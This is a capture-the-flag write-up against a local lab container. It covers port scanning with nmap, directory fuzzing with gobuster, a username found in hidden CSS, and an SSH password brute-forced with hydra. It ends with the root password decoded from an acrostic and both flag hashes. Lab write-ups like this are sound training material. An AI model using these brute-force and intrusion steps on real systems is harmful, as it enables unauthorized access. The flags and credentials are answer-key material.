# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.166 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.077 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1019ms
rtt min/avg/max/mdev = 0.077/0.121/0.166/0.044 ms
```

Device is recognizable
Probably a linux OS
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC --min-rate 5000 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 21:39 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ac:49:60:90:20:5a:92:7d:7b:4d:13:98:0d:ae:52:6b (ECDSA)
|_  256 68:cd:ce:ec:58:42:e5:c7:52:46:ca:1f:b6:26:a4:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TechWorld Noticias
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: C2:0F:59:1D:44:85 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds
```

Discovered two open ports
- 22 running SSH
- 80 running a web service in Apache
# Web enumeration
## Dir Fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql,zip,md

===========================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              sql,zip,md,php,html,conf,sh,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.zip             (Status: 403) [Size: 275]
.hta.md              (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.htaccess.zip        (Status: 403) [Size: 275]
.htaccess.sql        (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.htaccess.md         (Status: 403) [Size: 275]
.hta.sql             (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htpasswd.sql        (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.md         (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htpasswd.zip        (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 5678]
index.html           (Status: 200) [Size: 5678]
server-status        (Status: 403) [Size: 275]
Progress: 41517 / 41517 (100.00%)
===============================================================
Finished
===============================================================
```
# Hidden user
Exploring the source code, there's a strange css property
```sh
curl -s http://172.17.0.2/ | grep pipe

top: pipe;
```
# SSH brute force
```sh
hydra -l pipe -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

sHydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-16 21:50:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: pipe   password: kisses
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-16 21:50:59
```
# SSH login
```sh
ssh pipe@172.17.0.2
pipe@172.17.0.2's password: kisses
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.13-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Jul 10 17:15:11 2025 from 172.17.0.1
Windows PowerShell
Copyright (C) Microsoft Corporation. Todos los derechos reservados.

Intente el nuevo Windows Terminal: https://aka.ms/terminal

PS C:\Users\pipe>
```

As the name suggest this server pretends to be Windows but is really Ubuntu
# Privilege Escalation
## User Flag
```powershell
type user.txt
d970977b69a543ce746095e2b660d107
```
## Riddle
In the web there's another hint
```sh
curl -s http://172.17.0.2/ | grep hidden
<article hidden="acrostico inicial">
```

That acrostic is composed by the titles in the web page
```sh
curl -s http://172.17.0.2/ | grep h2 | tr '><' ' ' | awk '{print substr($2, 1, 1)}'
h
H
W
I
N
S
E
R
V
E
R
R
O
O
T
F
A
K
E
N
E
W
S
```

*WinServerRootFakeNews*

Using this as a password

```sh
su root
Password: WinServerRootFakeNews
root@ac0c877b1bb8:/home/pipe#
```

## Root Flag
``` sh
cat root.txt
fa209fcfb40c4276bd2ceb9f08bf5f7b
```